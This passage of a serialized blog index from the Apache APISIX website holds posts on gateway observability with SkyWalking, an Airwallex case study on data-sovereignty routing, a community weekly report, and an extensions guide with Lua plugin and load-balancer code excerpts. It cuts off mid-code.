APISIX","metadata":{"permalink":"/blog/2021/11/04/skywalking","source":"@site/blog/2021/11/04/skywalking.md","title":"The observability of Apache APISIX","description":"This article introduces the observability capabilities of Apache APISIX and how to improve the observability capabilities of Apache APISIX through Apache SkyWalking.","date":"2021-11-04T00:00:00.000Z","formattedDate":"November 4, 2021","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"},{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":6.08,"truncated":true,"authors":[{"name":"Haochao Zhuang","title":"Author","url":"https://github.com/dmsolr","image_url":"https://avatars.githubusercontent.com/u/29735230?v=4","imageURL":"https://avatars.githubusercontent.com/u/29735230?v=4"},{"name":"Yilin Zeng","title":"Technical Writer","url":"https://github.com/yzeng25","image_url":"https://avatars.githubusercontent.com/u/36651058?v=4","imageURL":"https://avatars.githubusercontent.com/u/36651058?v=4"}],"prevItem":{"title":"Cloud Monitoring with Datadog in Apache APISIX","permalink":"/blog/2021/11/12/apisix-datadog"},"nextItem":{"title":"API Gateway Practice in Airwallex with APISIX","permalink":"/blog/2021/11/03/airwallex-usercase"}},"content":"> This article introduces the observability capabilities of Apache APISIX and how to improve the observability capabilities of Apache APISIX through Apache SkyWalking.\\n\\n\x3c!--truncate--\x3e\\n\\nObservability is the ability to observe the runtime state and resource usage of the internal program of the system from the outside of the system. The main measures of observability are Metrics, Logging, and Tracing, and the following diagram shows the relationship between Metrics, Logging, and Tracing.\\n\\n![Metrics, Logging and Tracing Relationship Diagram](https://static.apiseven.com/202108/1635993536337-f8ee034d-ef3b-40b6-9886-ebde62d8edc6.png)\\n\\nFor example, the overlap between Tracing and Logging represents the logs generated by Tracing at the request level, and the Tracing ID is used to associate Tracing and Logging. After performing certain aggregation operations on this log, some Metrics can be obtained. Tracing itself also generates some Metrics, such as the relationship between the call volume.\\n\\n## Observability Capabilities of Apache APISIX\\n\\nApache APISIX has comprehensive observability capabilities: support for Tracing and Metrics, a rich ecosystem of Logging plug-ins, and support for querying node status.\\n\\n### Tracing\\n\\nApache APISIX supports a variety of Tracing plugins, including: Zipkin, OpenTracing and SkyWalking. Note that: Tracing plug-in is closed by default, you need to manually open Tracing plug-in before use. Tracing plugin needs to be bound to routing or global rules. If there is no requirement for sampling rate, it is recommended to bind to global rules to avoid omissions.\\n\\n### Metrics\\n\\nIn Apache APISIX, Metrics related information is reported through Prometheus Exporter, which is compatible with the Prometheus data format. There are two things to be aware of when using the Prometheus Plugin in Apache APISIX.\\n\\n**First, please try to improve the readability of the names of all three - route, service and upstream.**\\n\\nThere is a parameter named `prefer_name` in Prometheus Plugin. When the value of this parameter is set to `true`, that is: `prefer_name: true`. If the names of routing, service and upstream are relatively readable, This will bring some benefits: when you monitor the parameters on the large screen through Grafana, you can not only clearly display all the data, but also clearly know the source of the data. If the value of the `prefer_name` parameter is `false`, only the ID of the resource will be displayed as the data source, such as the routing ID and upstream ID, which will cause the problem of low readability of the monitor screen.\\n\\n**Second, the Prometheus Plugin must be bound to a route or global rule before it can view the metrics of the specified resource.**\\n\\nAfter the above setup, the Metrics data will be stored in Prometheus. Since Prometheus has good storage performance, but poor display performance, we need to use the Grafana Dashboard to display the data. We can see the Metrics for the Nginx instance, the Metrics for the network bandwidth, the Metrics for the routes and upstream, and more, as shown in the following image.\\n\\n![Grafana Dashboard](https://static.apiseven.com/202108/1635993660940-9c9bbb0b-d5f1-4add-b93d-1f076de9aebd.png)\\n\\n### Logging\\n\\nApache APISIX supports a variety of logging plugins to share log data directly with other external platforms. The Error Log plug-in supports HTTP and TCP protocols, and is compatible with the log format of SkyWalking. Logs can also be synchronized to logging platforms for processing through log collection components such as FluentBit.\\n\\nThe Access Log plugin does not currently support nesting inside the log format. Because the Access Log plugin is route-level, it needs to be bound to a route in order to collect access logs for the route. However, the log format is global, and there can only be one global log format.\\n\\n### Support Querying Node Status\\n\\nApache APISIX supports querying node status. When enabled, information about the nodes can be collected via `/apisix/status`, including the number of nodes, the number of waiting links, the number of connections processed, etc.\\n\\n![Node Status](https://static.apiseven.com/202108/1635993774170-ca3bf15d-9f55-42ac-9a2f-2d8955f74c5c.png)\\n\\n### Pitfalls\\n\\nAs mentioned above, Apache APISIX has a well-established observability capability to collect information such as Metrics, Logging, and Tracing. Although the built-in plug-in of Apache APISIX and Grafana Dashboard can solve the problems of monitoring data collection and indicator visualization, all kinds of data are scattered on various platforms. It is expected that an observability analysis platform can integrate Metrics, Logging, and Tracing information and link all data together.\\n\\n## Use Apache SkyWalking to Enhance the Observation Capabilities of Apache APISIX\\n\\nApache SkyWalking is an application performance monitoring (APM) and observability analysis platform for distributed systems. It provides multi-dimensional application performance analysis methods, from distributed topology diagrams to application performance indicators, traces, log correlation analysis and alarms.\\n\\n![Apache SkyWalking](https://static.apiseven.com/202108/1635993914263-b7511acd-9bcf-49ca-aa32-911fc85acfac.png)\\n\\n### One-stop Data Processing\\n\\nApache SkyWalking supports interfacing with Metrics, Logging, Tracing and other monitoring data, compatible with the Prometheus data model, and can also be used to generate new Metrics through secondary aggregation by Log Analysis Language.\\n\\n### More Detailed Data Presentation\\n\\nThe Dashboard of Apache SkyWalking is divided into two areas: the upper area for feature selection and the lower area for panel content. The upper part is the feature selection area, and the lower part is the content of the dashboard, which provides Metrics related information in multiple entity dimensions, such as Global, Service, Example, Endpoint, etc., and supports different views to show the observability. Take the global view as an example, the displayed Metrics include: service load, number of slow services, number of unhealthy services, etc., as shown in the figure below.\\n\\n![Data Display](https://static.apiseven.com/202108/1635993968588-403c9219-ae66-4b97-9eee-dcb97067b789.png)\\n\\nAnother thing worth mentioning is the Trace view of SkyWalking Dashboard. SkyWalking provides 3 display forms: list, tree diagram and table. Trace view is a typical view of distributed tracing. These views allow users to view trace data from different angles, especially the time-consuming relationship between spans.\\n\\nSkyWalking Dashboard also supports topology diagrams. The topology diagram is the overall topology structure analyzed based on the probe uplink data. The topology diagram supports clicking to show and drill down the performance statistics, tracing, and alerts of individual services, and you can also click on the relationship lines in the topology diagram to show the performance Metrics between services and between service examples.\\n\\n### Support Containerized Deployments\\n\\nKubernetes is an open source cloud-native containerized cluster management platform that aims to make deploying containerized applications simple and efficient. The Apache SkyWalking backend can be deployed in Kubernetes, and thanks to the efficient management of Kubernetes, high availability of UI components can be guaranteed.\\n\\nIf Apache APISIX is deployed on a cluster, Apache SkyWalking supports the deployment of SkyWalking Satellite in the form of sidecar or service discovery to monitor Apache APISIX in the cluster.\\n\\n## Future Plans\\n\\nApache APISIX will continue to enhance observability-related feature support in the future, such as\\n\\n1. Solve the problem of missing peer of SkyWalking Nginx-Lua plugin\\n\\n2. Support printing trace id in the log\\n\\n3. Access to the access log\\n\\n4. Support gateway metadata\\n\\n## Conclusion\\n\\nThis article introduces the observability capabilities of Apache APISIX and how Apache SkyWalking can enhance the observability capabilities of Apache APISIX. The two communities will continue to work together to further enhance the observability of Apache APISIX in the future. We hope you can get more involved in the Apache APISIX and Apache SkyWalking projects. If you are interested in these two open source projects but are not familiar with the code, writing articles, making videos, sharing them externally, and actively participating in community and mailing list discussions are all great ways to get involved."},{"id":"API Gateway Practice in Airwallex with APISIX","metadata":{"permalink":"/blog/2021/11/03/airwallex-usercase","source":"@site/blog/2021/11/03/airwallex-usercase.md","title":"API Gateway Practice in Airwallex with APISIX","description":"This article will bring you about how Airwallex uses Apache APISIX for gateway layer deployment to strengthen the construction of data sovereignty.","date":"2021-11-03T00:00:00.000Z","formattedDate":"November 3, 2021","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":9.535,"truncated":true,"authors":[{"name":"Yang Li"}],"prevItem":{"title":"The observability of Apache APISIX","permalink":"/blog/2021/11/04/skywalking"},"nextItem":{"title":"Weekly Report (Oct.15 - Oct.31)","permalink":"/blog/2021/11/02/weekly-report-1031"}},"content":"> This article will bring you about how Airwallex uses Apache APISIX for gateway layer deployment to strengthen the construction of data sovereignty.\\n\\n\x3c!--truncate--\x3e\\n\\n## Why deal with data sovereignty?\\n\\n[Airwallex](https://www.airwallex.com) is a global financial technology company that helps global users with payment services and cross-border payment scenarios. A global financial infrastructure platform has been built, and the payment network has covered more than 50 currencies in more than 130 countries and regions around the world, providing enterprises with digital financial technology products.\\n\\n![Airwallex Business](https://static.apiseven.com/202108/1646626634389-7d9a0a82-a76c-4645-93b6-8a431bb1f9a1.png)\\n\\nUnder the demand of global service content, the risk of data sovereignty must be considered in the conduct of the company\'s business.\\n\\n### What is data sovereignty?\\n\\nData sovereignty refers to the national sovereignty in cyberspace, which reflects the status of the state as the subject of controlling data rights. Before describing the importance of data sovereignty, let\'s give a few examples.\\n\\nGDPR (General Data Protection Regulation) is a regulatory document formulated by the European Union, which is aimed at the privacy and protection of personal data. One of the most basic requirements in GDPR is that all user data collection activities need to be approved by the user, while ensuring that the user can clear personal data on their own.\\n\\nTherefore, if the Airwallex wants to transfer European data to other regions, it must ensure that the requirements of third-party countries on data sovereignty meet the requirements of the European Union on data sovereignty.\\nWith regard to the need for data to comply with local laws, there are indeed a lot of concerns in multinational operations.\\n\\nFor example, the American Patriot Act requires all data stored in the United States, or data stored by American companies, to be regulated in the United States, and the US Department of Justice and CIA can require companies to provide data.\\n\\nAfter 9 / 11, 2013, the Justice Department asked Microsoft to provide some of the email information it stored on its servers in Ireland, when Microsoft rejected the request on the grounds that it would violate EU regulatory requirements. Then the U.S. Department of Justice took Microsoft to court, but Microsoft won in the end. Later, in order to avoid the risk of the opposite of data sovereignty, many American companies put their data centers directly to Europe, thinking that it would be safe. But in some recent cases, judges have ruled that the United States still has the authority to ask for data from American companies in Europe.\\n\\nJudging from the above events, data sovereignty has indeed brought great challenges to Airwallex\'s global business, and how to properly handle the issue of data sovereignty in the business has become particularly important.\\n\\n### Current situation of transnational business data transmission\\n\\nBecause the business involves transnational attributes, some problems will be encountered in the technical processing.\\n\\n![Airwallex Business Process](https://static.apiseven.com/202108/1646626634395-c0076f05-0610-43f0-80b5-3110f30db183.png)\\n\\nThe data flow of multinational corporations is reflected in a variety of interactions between different regions. In the absence of data sovereignty claims, the data can be stored in Europe and then Synchronize to any data center in Asia or the world. When you make a subsequent data service request, you only need to encapsulate the business into a service.\\n\\nBut in the current era of emphasis on data sovereignty, the above approach will not work. Because the flow of a lot of data is beginning to be controlled, the previous architecture cannot be used. Domestic data can only be processed locally, not transnational requests. So when we store user data in the user\'s home scope that is, the \\"closed alone\\" architecture in the following figure), problems begin to emerge.\\n\\n![Single Deployment](https://static.apiseven.com/202108/1635907812255-73d11508-d9ec-4ac6-b0a0-5913a1acb2c8.png)\\n\\nFirst of all, it is impossible to make the service completely stateless in this case, and most of the scenarios are not that simple in real business. Because the completion of the business, it is bound to involve the interaction between multiple clusters.\\n\\n![Multi-cluster Interaction](https://static.apiseven.com/202108/1635907812257-962b1247-f5ca-448f-904d-fd47c3ea4586.png)\\n\\nTherefore, in the aspect of data storage, the first problem to be solved is the region / region identification configuration at the data entrance. Just like Amazon, e-books purchased in the United States cannot be downloaded to their own Kindle using their national accounts. Because the data between countries (regions) is completely isolated. As long as users click on Amazon China, it means that all your requests will not step out of the Chinese data center.\\n\\nAmazon\'s mode of operation actually allows users to decide where to store their personal data, but the resulting problem is that in the case of single-person and multi-regional accounts, it is very inconvenient for individual users to manage and Synchronize.\\n\\nTherefore, for business processing in multi-regions and multi-scenarios, we should also need a \\"sharp weapon\\" to dynamically allocate and determine the direction of the follow-up data.\\n\\n## Building Apache APISIX Intelligent routing Gateway\\n\\nTherefore, based on the above business scenarios, we decided to adopt the \\"intelligent routing\\" mode, through the gateway to determine the foothold and direction of different types of data requests.\\n\\n![Intelligent Routing Mode](https://static.apiseven.com/202108/1635907812259-59637175-4beb-4e1e-a813-bb7c40a5acf9.png)\\n\\nThe above figure is the architecture diagram in \\"intelligent routing\\" mode. The gateway is mainly divided into two layers, the first layer is responsible for routing requests, according to the conditions to determine which data center the request should reach, and the second layer gateway is for traffic forwarding. Therefore, the main problem solved by the gateway in this mode is to assign a \\"destination\\" to each request, and then carry out subsequent traffic forwarding and business processing.\\n\\nCurrently, in our business scenarios, traffic information is mainly divided into two categories:\\n\\nUnidentified request\uff1a\\n\\n- Registration: the information is incomplete when a user registers for the first time, and he / she does not know which data center the user\'s registration data is in.\\n- static resources: for example, HTML, CSS, etc., you do not need to know the identity of the user.\\n\\nKnown identity request\uff1a\\n\\n- Login: the user logs in, indicating that the registration process has been completed, and the location of the data center is known at this time.\\n- password reset: you can check where the data is through user name, mobile phone number, mailbox, city and other information, and then distribute subsequent requests\\n- Business operations in complex scenarios\\n\\nIn the deployment at the gateway level, we use [Apache APISIX](https://github.com/apache/apisix). Next, we will briefly introduce how to deal with dynamic, multi-data center routing scenarios based on Apache APISIX\'s API gateway.\\n\\n### Scenario 1: login and password reset\\n\\nWe can get the user name and password when the user logs in, but the password cannot be used as identification information, and it is not allowed to be passed casually. Therefore, it can only be queried according to the user name to determine which region the user belongs to. Business is the need to design a global Synchronize data storage.\\n\\n![Log-in Mode](https://static.apiseven.com/202108/1635907812260-69fbda9e-56cc-443d-8ea7-a1f10dba041e.png)\\n\\nIn this case, we have carried out the data storage architecture shown above, which can ensure the globalization of data Synchronize. For example, when a user registers an account in China, we convert the relevant data into Kafka message, through CDC (Change Data Capture) and receive local messages through a special listener, and then make further conversion. For example: excluding user name, Email and other personal information, these information can not be stored across borders.\\n\\nIn the process of converting (Transformer), salt or hash encryption can be carried out, and finally, the relevant business requests can be processed at the gateway layer, that is, data area allocation and subsequent traffic forwarding. Realize the business processing based on the Apache APISIX gateway level.\\n\\n### Scenario 2: business operations in complex scenarios\\n\\nThe business operation is that when I manipulate a piece of data, how should I decide where the data is going to be executed. Conventional business operations, such as a user querying his own account information or history, are generally divided into two modes.\\n\\n![Business Operation Mode](https://static.apiseven.com/202108/1635907812247-123eca67-5039-487c-9d02-f3881e16c411.png)\\n\\n#### Stateful Mode\\n\\nStateful mode generally makes use of Session (as shown on the left side of the figure above). After the client has logged in, Sever will give the Cookie with Session ID to the client. Upon request, the gateway layer implemented based on Apache APISIX uses the information in Cookie to query the user\'s region. Even if the user changes the server, the login status can still be maintained, and the system can also determine where to get the data.\\n\\nFor example, users are traveling across borders, initially logging into the system in Europe and flying to Asia. When logging in in Asia, the system will determine which data center the user information is in through Session, and the request will be distributed to the corresponding data center for subsequent business operations.\\n\\n#### Stateless Mode\\n\\nUsually we will not only provide web access, but also have some API access to integrate. Therefore, when making API access, the way to pass Session ID through Cookie is not appropriate. In this case, we use a special Token (as shown on the right side of the figure above). The Token contains specific information about the data center so that Apache APISIX can decide which data center to access based on the Token.\\n\\nThe advantage of this is that it can remain dynamic when the business is expanded later. If the initial design is static and the data center is determined based on the information at the time of the initial registration, it will be very difficult to deal with cross-data center scenarios in the future.\\n\\nThere is also a more complex scenario in stateless mode, which is user registration. Because when registering, you can only decide which data center to put in according to the registration information filled in by the user. But if the user emigrates later, or the company migrates somewhere else, we have to clean up the relevant data and migrate all the user\'s transaction data, user name, password and so on to another data center. This kind of data switching cost is actually relatively high.\\n\\nAt present, we also support complex scenarios such as users switching data centers, but we will also start to consider how to reduce the impact of switching data centers on the overall architecture.\\n\\n## Attitude about data sovereignty\\n\\nIn fact, everything we mentioned above illustrates one problem, that is, \\"data and location\\". However, before the division of data ownership, there is a very important premise, that is, the degree of information processing.\\n\\nThe data is sensitive, and when we get user data for data analysis/commercial BI or other big data analysis, we can\'t use it immediately. We should first carry out the Filter of sensitive information at the personal level, in addition, at the data aggregation level, when the data from the same region are aggregated to look at the overall data, and then abstract the user information again, so as to achieve the state that the user can not be fully identified.\\n\\nOnly in this way can we meet the regulatory requirements and use this information for data analysis. This is the most fundamental requirement of data processing. While we standardize data supervision, we should also ensure the \\"security\\" of user information.\\n\\nOf course, the shared Apache APISIX based gateway-level processing of data sovereignty is only part of the process of \\"dealing with the risk of data sovereignty\\". We expect the Apache APISIX gateway to help Airwallex do better and better at the level of data sovereignty, and so far, Apache APISIX has done what we expect."},{"id":"Weekly Report (Oct.15 - Oct.31)","metadata":{"permalink":"/blog/2021/11/02/weekly-report-1031","source":"@site/blog/2021/11/02/weekly-report-1031.md","title":"Weekly Report (Oct.15 - Oct.31)","description":"The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community.","date":"2021-11-02T00:00:00.000Z","formattedDate":"November 2, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.605,"truncated":true,"authors":[],"prevItem":{"title":"API Gateway Practice in Airwallex with APISIX","permalink":"/blog/2021/11/03/airwallex-usercase"},"nextItem":{"title":"Apache APISIX Extensions Guide","permalink":"/blog/2021/10/29/extension-guide"}},"content":"> From 10.15 to 10.31, 31 contributors submitted 93 commits for Apache APISIX. Thank you all for your contributions to Apache APISIX. It is your selfless contribution to make the Apache APISIX project better!\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community from the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements cannot be achieved without the joint efforts of our community partners.\\n\\n\\"If you want to go fast, go alone.If you want to go far, go together.\\" The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community and and facilitate everyone to participate in the Apache APISIX community.\\n\\nWe have also compiled some issues suitable for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Contributors List](https://static.apiseven.com/202108/1635733917401-732f84d0-24a1-4c31-acea-4e45f5e56816.png)\\n\\n![New Contributors](https://static.apiseven.com/202108/1635735281818-c6cb23ce-4242-44ee-a569-38a46b607253.31eng)\\n\\n## Good first issue\\n\\n### Issue #686\\n\\n**Link**: https://github.com/apache/apisix-website/issues/686\\n\\n**Issue description**: In order to speed up the loading speed of pictures/images on the Apache APISIX official website, we need to migrate all pictures/images to CDN.\\n\\n### Issue #5305\\n\\n**Link**: https://github.com/apache/apisix/issues/5305\\n\\n**Issue description**:\\n\\nCurrently I has test the proxy-mirror plugin in apisix, but I find that the feature of this plugin is different from the ngx_http_mirror_module in nginx. The mirror moudle of nginx can add the uri behind the host in \\"proxy_pass\\" directive, for example:\\n\\n```Groovy\\nlocation / {\\nmirror /mirror;\\nproxy_pass http://backend;\\n}\\n\\nlocation = /mirror {\\ninternal;\\nproxy_pass http://test_backend$request_uri;\\n}\\n```\\n\\nBut when I test the proxy-mirror plugin in apisix dashboard, it prompts a message that the blank cannot be filled with URI. Will the proxy-mirror plugin be optimized to support the URI?\\n\\n![Issue Screenshot](https://static.apiseven.com/202108/1635734126653-8fe4c1e7-5b9a-4e78-b747-fb30cbae7f36.png)\\n\\n### Issue #5342\\n\\n**Link**: https://github.com/apache/apisix/issues/5342\\n\\n**Issue description**: Share limit counter between routes.\\n\\nTo do this, you need to specify the key of the route\'s corresponding limit-count in lrucache so that the same limit object is shared across multiple routes. lrucache keys (hereafter called groups to distinguish them from limit keys) are currently generated automatically, ensuring that each route\'s group is independent. For this change, we need to be able to specify the group in the limit-count.\\n\\n```yaml\\n\\"limit-count\\": {\\n        \\"group\\": \\"group_id_blah\\"\\n        \\"count\\": 2,\\n        \\"time_window\\": 60,\\n        \\"rejected_code\\": 503,\\n        \\"key\\": \\"remote_addr\\"\\n}\\n```\\n\\nNote that the configuration of the same group needs to be the same, which currently needs to be guaranteed by the caller, otherwise the limit object obtained by the group will be different from the configuration.\\n\\n### Issue #5343\\n\\n**Link**: https://github.com/apache/apisix/issues/5343\\n\\n**Issue description**: Add a request_body switch to the schema, and each body can be used by expr to decide whether to log or not. Without this switch, the body is not logged.\\n\\n```json\\n\\"kafka-logger\\": {\\n   \\"broker_list\\":{\\n       \\"127.0.0.1\\":9092\\n    },\\n   \\"kafka_topic\\" : \\"test2\\",\\n   \\"request_body\\": {\\n       \\"expr\\": [\\n          [\\"request_length\\", \\"<\\", \\"1024\\"],\\n       ]\\n   },\\n   \\"key\\" : \\"key1\\",\\n   \\"batch_max_size\\": 1,\\n   \\"name\\": \\"kafka logger\\"\\n}\\n```\\n\\n`expr` can be evaluated by lua-resty-expr. request body can be fetched by core.request.get_body.\\n\\n## Highlights of Recent Features\\n\\n- [APISIX Ingress introduces custom resources of ApisixRoute v2beta2 version, and discards the backend field](https://github.com/apache/apisix-ingress-controller/pull/698)\uff08Contributor: [tao12345666333](https://github.com/tao12345666333)\uff09\\n\\n- [APISIX Ingress upgraded the CRD resource version to v1 to better support K8s v1.22 and above](https://github.com/apache/apisix-ingress-controller/pull/697)\uff08Contributor: [tao12345666333](https://github.com/tao12345666333)\uff09\\n\\n- [APISIX Ingress adds documentation on how to use gRPC proxy](https://github.com/apache/apisix-ingress-controller/pull/699)\uff08Contributor: [gxthrj](https://github.com/gxthrj)\uff09\\n\\n- [APISIX Dashboard supports proto management API](https://github.com/apache/apisix-dashboard/pull/2099)\uff08Contributor: [bzp2010](https://github.com/bzp2010)\uff09\\n\\n- [APISIX Dashboard supports transferring dashboard static resources as gzip](https://github.com/apache/apisix-dashboard/pull/2178)\uff08Contributor: [nic-6443](https://github.com/nic-6443)\uff09\\n\\nThe Apache APISIX project website and the Github issue have accumulated a wealth of documentation and experience, so if you encounter problems, you can read the documentation, search the issue with keywords, or participate in the discussion on the issue to put forward your own ideas and practical experience.\\n\\n## Recent Blog Recommendations\\n\\n- [Apache APISIX Extensions Guide](http://apisix.apache.org/blog/2021/10/29/Extension-guide)\uff1a\\n\\n  This article provides an extension guide for Apache APISIX, aiming to provide users with some ideas for extending Apache APISIX.\\n\\n- [From 0 to 1, How APISIX Ingress Has Grown and Gained Since Joining The Community](https://apisix.apache.org/blog/2021/10/26/APISIX-Ingress/)\uff1a\\n\\n  This article describes the growth of APISIX Ingress and the details of the enhancements and community help that APISIX Ingress has received since joining the community.\\n\\n- [Tutorial: How to use Cert Manager to manage certificates in Apache APISIX Ingress Controller](https://apisix.apache.org/blog/2021/10/22/cert-manager-in-ingress/)\uff1a\\n\\n  This article shows how to create a certificate and pair it with Apache APISIX Ingress Controller via the Cert Manager."},{"id":"2021/10/29/extension-guide","metadata":{"permalink":"/blog/2021/10/29/extension-guide","source":"@site/blog/2021/10/29/Extension-guide.md","title":"Apache APISIX Extensions Guide","description":"This article introduces the expansion direction of Rewrite or Access, configuring service discovery, configuring load balancing, and processing responses.","date":"2021-10-29T00:00:00.000Z","formattedDate":"October 29, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":7.69,"truncated":true,"authors":[{"name":"Zexuan Luo","url":"https://github.com/spacewander","imageURL":"https://avatars.githubusercontent.com/u/4161644?v=4"}],"prevItem":{"title":"Weekly Report (Oct.15 - Oct.31)","permalink":"/blog/2021/11/02/weekly-report-1031"},"nextItem":{"title":"How APISIX Ingress grown from 0 to 1","permalink":"/blog/2021/10/26/apisix-ingress"}},"content":"> This article provides an extension guide for Apache APISIX, aiming to provide users with some ideas for extending Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\nApache APISIX provides more than 50 plugins, several commonly used load balancing selectors, and support for mainstream service discovery (such as Nacos and DNS). The API gateway is closely related to the internal business of the enterprise. In order to meet the business needs of the enterprise, users usually need to add some code on the basis of Apache APISIX to realize the functions required by the business. How to expand Apache APISIX has become a common pain point for many users: on the premise of ensuring the smooth operation of Apache APISIX, how to add business code to meet actual needs?\\n\\nThis article provides an extension guide for Apache APISIX, aiming to provide users with some ideas for extending Apache APISIX. Since Apache APISIX is in a stage of rapid development and the frequency of version iterations is relatively high, this article will be based on the first LTS version v2.10.0 of Apache APISIX. If your Apache APISIX version is lower than 2.10.0, you may need to make some modifications based on actual conditions. In addition, although this article only explains the HTTP-related logic, the TCP-related parts are generally similar.\\n\\n## Expansion Direction 1: Rewrite or Access?\\n\\nLet\'s start with the life cycle of the request: when a request enters Apache APISIX, it will first be processed by the method `http_access_phase`. Readers who are familiar with the concept of OpenResty phases may be a little confused: OpenResty has a total of 6 phases, which are arranged in order of execution: `rewrite`, `access`, `before_proxy`, `header_filter`, `body_filter` and `log`, why is `access` at the beginning, and where is `rewrite`?\\n\\nThe phases concept of the Apache APISIX plug-in is slightly different from the OpenResty phases concept. In order to improve the performance of Apache APISIX, the rewrite method of the APISIX plugin will run in the access phase of OpenResty. Users can still customize the logic of `rewrite` at the plugin level, but at the code level, `rewrite` is actually executed in `access`.\\n\\nAlthough both the logic of `rewrite` and the logic of `access` run in the access phase, the logic of `rewrite` will still be executed before the logic of `access`. In order to avoid the failure of subsequent plugins to execute `rewrite` and fail to execute `access`, which will cause trace omissions, trace logic must be added to `rewrite`.\\n\\nIn addition to the order of execution, there is another difference between `rewrite` and `access`, that is, there is a logic for processing `consumer` between them:\\n\\n```Lua\\n plugin.run_plugin(\\"rewrite\\", plugins, api_ctx)\\n        if api_ctx.consumer then\\n            ...\\n        end\\n        plugin.run_plugin(\\"access\\", plugins, api_ctx)\\n```\\n\\n`consumer` represents an identity. You can control permissions for different consumers. For example, use the plugin `consumer-restriction` to implement role-based permission control, which is what everyone calls RBAC. In addition, you can also set corresponding current limiting strategies for different `consumer`.\\n\\nThe authentication plugin in Apache APISIX (with `type = \\"auth\\"` in the plugin definition), you need to select the `consumer` in the `rewrite` stage. Here we use the `key-auth` plugin as an example:\\n\\n```Lua\\nlocal _M = {\\n    version = 0.1,\\n    priority = 2500,\\n    type = \'auth\',\\n    name = plugin_name,\\n    schema = schema,\\n    consumer_schema = consumer_schema,\\n}\\n\\n...\\nfunction _M.rewrite(conf, ctx)\\n    ...\\n    local consumer_conf = consumer_mod.plugin(plugin_name)\\n    if not consumer_conf then\\n        return 401, {message = \\"Missing related consumer\\"}\\n    end\\n\\n    local consumers = lrucache(\\"consumers_key\\", consumer_conf.conf_version,\\n        create_consume_cache, consumer_conf)\\n\\n    local consumer = consumers[key]\\n    if not consumer then\\n        return 401, {message = \\"Invalid API key in request\\"}\\n    end\\n\\n    consumer_mod.attach_consumer(ctx, consumer, consumer_conf)\\nend\\n```\\n\\nThe execution logic of the authentication plugins is similar: first obtain a certain set of parameters from the input of the users, then find the corresponding `consumer` according to the parameters, and finally append the `consumer_conf` corresponding to the plugin to `ctx`.\\n\\nIn summary, for plugins that do not need to be executed in the early stage of the request and do not need to find the `consumer`, it is recommended to write the logic in the `access`.\\n\\n## Extension Direction 2: Configure Service Discovery\\n\\nAfter executing the `access`, we are about to deal with the Upstream. Normally, the Upstream node is hard-coded on the Upstream configuration. However, it is also possible to obtain nodes from the service discovery to implement discovery.\\n\\nNext, we will take Nacos as an example to talk about how to implement it.\\n\\nAn Upstream configuration that dynamically acquires a node managed by Nacos is as follows.\\n\\n```JSON\\n{\\n    \\"service_name\\": \\"APISIX-NACOS\\",\\n    \\"type\\": \\"roundrobin\\",\\n    \\"discovery_type\\": \\"nacos\\",\\n    \\"discovery_args\\": {\\n        \\"namespace_id\\": \\"test_ns\\",\\n        \\"group_name\\": \\"test_group\\"\\n    }\\n}\\n```\\n\\nWe can see three of these important variables:\\n\\n1. `discovery_type`: Types of Service Discovery,`\\"discovery_type\\": \\"nacos\\"` indicates service discovery using Nacos.\\n2. `service_name`: Service Name\u3002\\n3. `discovery_args`: different discovery-specific parameters, specific parameters of Nacos include: `namespace_id` and `group_name`.\\n\\nThe Lua code corresponding to Nacos discovery is located in `discovery/nacos.lua`. Open the file `nacos.lua`, we can see that several required methods are implemented in it.\\n\\nA discovery needs to implement at least two methods: `nodes` and `init_worker`.\\n\\n```Lua\\nfunction _M.nodes(service_name, discovery_args)\\n    local namespace_id = discovery_args and\\n            discovery_args.namespace_id or default_namespace_id\\n    local group_name = discovery_args\\n            and discovery_args.group_name or default_group_name\\n\\n    ...\\nend\\n\\nfunction _M.init_worker()\\n    ...\\nend\\n```\\n\\nThe function signature of `nodes` has already explicitly shown the query parameters used to get new nodes: `service_name` and `discovery_args`. For each request, Apache APISIX will use this set to query for the latest node. The method returns an array:\\n\\n```Bash\\n{\\n    {host = \\"xxx\\", port = 12100, weight = 100, priority = 0, metadata = ...},\\n    # priority and metadata are optional\\n    ...\\n}\\n```\\n\\nAnd `init_worker` is responsible for starting a timer in the background to ensure that the local node data is consistent with the data discovered by the service.\\n\\n## Expansion Direction 3: Configure Load Balancing\\n\\nAfter obtaining a set of nodes, we have to decide which node to try first in accordance with the rules of load balancing. If several commonly used load balancing algorithms cannot meet your needs, you can also implement a load balancing by yourself.\\n\\nLet\'s take load balancing with the least number of connections as an example. The corresponding Lua code is located in `balancer/least_conn.lua`. Open the file `least_conn.lua`, we can see that it implements several required methods: `new`, `get`, `after_balance` and `before_retry_next_priority`.\\n\\n- `new` is responsible for doing some initialization work.\\n\\n- `get` is responsible for executing the logic of the selected node.\\n\\n- `after_balance` will run in the following two situations:\\n\\n  - Before each retry (when before_retry is true)\\n  - After the last try\\n\\n- `before_retry_next_priority` runs before preparing to try the next set of nodes with the same priority, while the current set has been tried.\\n\\n```Lua\\nfunction _M.new(up_nodes, upstream)\\n    ...\\n\\n    return {\\n        upstream = upstream,\\n        get = function (ctx)\\n            ...\\n        end,\\n        after_balance = function (ctx, before_retry)\\n            ...\\n            if not before_retry then\\n                if ctx.balancer_tried_servers then\\n                    core.tablepool.release(\\"balancer_tried_servers\\", ctx.balancer_tried_servers)\\n                    ctx.balancer_tried_servers = nil\\n                end\\n\\n                return nil\\n            end\\n\\n            if not ctx.balancer_tried_servers then\\n                ctx.balancer_tried_servers = core.tablepool.fetch(\\"balancer_tried_servers\\", 0, 2)\\n            end\\n\\n            ctx.balancer_tried_servers[server] = true\\n        end,\\n        before_retry_next_priority = function (ctx)\\n            if ctx.balancer_tried_servers then\\n                core.tablepool.release(\\"balancer_tried_servers\\", ctx.balancer_tried_servers)\\n                ctx.balancer_tried_servers = nil\\n            end\\n        end,\\n    